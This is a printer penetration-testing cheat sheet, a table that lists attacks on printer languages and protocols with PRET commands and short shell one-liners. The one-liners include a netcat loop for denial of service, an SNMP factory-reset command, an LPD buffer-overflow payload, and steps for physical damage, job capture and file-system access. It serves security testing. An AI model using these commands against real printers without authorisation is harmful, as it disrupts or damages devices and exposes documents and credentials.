Printer Security Testing Cheat Sheet

To systematically check for vulnerabilities in a printing device, first perform a generic network assessment and check for printer-specifc web based information leaks using Praeda. Then, use the following cheat sheet to quickly find flaws in printer languages and network protocols.
Category | Attack | Protocol | Testing
--- | --- | --- | ---
Denial of service 	Transmission channel 	TCP 	while true; do nc printer 9100; done
Document processing 	PS 	PRET commands: disable, hang
PJL 	PRET commands: disable, offline
Physical damage 	PS 	PRET command: destroy
PJL 	PRET command: destroy
Privilege escalation 	Factory defaults 	SNMP 	snmpset -v1 -c public printer 1.3.6.1.2.1.43.5.1.1.3.1 i 6
PML 	PRET command: reset
PS 	PRET command: reset
Accounting bypass 	TCP 	Connect to printer directly, bypassing the print server
IPP 	Check if you can set a username without authentication
PS 	Check if PostScript code is preprocessed on print server
PJL 	PRET command: pagecount
Fax and Scanner 	multiple 	Install printer driver and (ab)use fax/scan functionality
Print job access 	Print job retention 	PS 	PRET command: capture
Print job manipulation 	PS 	PRET commands: cross, overlay, replace
Information disclosure 	Memory access 	PJL 	PRET command: nvram dump
File system access 	PS 	PRET commands: fuzz, ls, get, put, …
PJL 	PRET commands: fuzz, ls, get, put, …
Credential disclosure 	PS 	PRET commands: lock, unlock
PJL 	PRET commands: lock, unlock
Code execution 	Buffer overflows 	PJL 	PRET command: flood
LPD 	./lpdtest.py printer in "`python -c 'print "x"*3000'`"
Firmware updates 	PJL 	Flip a bit, check if the modified firmware is still accepted
Software packages 	multiple 	Obtain an SDK and write your own proof-of-concept application 
